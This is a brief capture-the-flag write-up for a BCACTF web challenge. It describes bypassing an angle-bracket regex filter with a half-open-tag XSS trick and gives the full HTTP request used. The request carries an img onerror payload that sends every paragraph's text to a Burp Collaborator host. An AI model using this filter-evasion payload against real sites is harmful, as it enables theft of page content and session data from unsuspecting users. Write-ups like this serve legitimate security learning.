* Bypass regex --> regex basically matching all content within <> angle braces
* Half open braces xss from owasp looks promising
  - https://owasp.org/www-community/xss-filter-evasion-cheatsheet

* payloads tried in exploit.html (for local test)

* request for exploit

```
POST / HTTP/1.1
Host: webp.bcactf.com:49155
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 179
Origin: http://webp.bcactf.com:49155
Connection: close
Referer: http://webp.bcactf.com:49155/
Upgrade-Insecure-Requests: 1

text=<img src=x onerror=document.querySelectorAll("p").forEach(function(node){fetch("http://6y5f15yr1wq9x32ylw8ywbnmldr4ft.burpcollaborator.net/?c=".concat(node.textContent))});
```

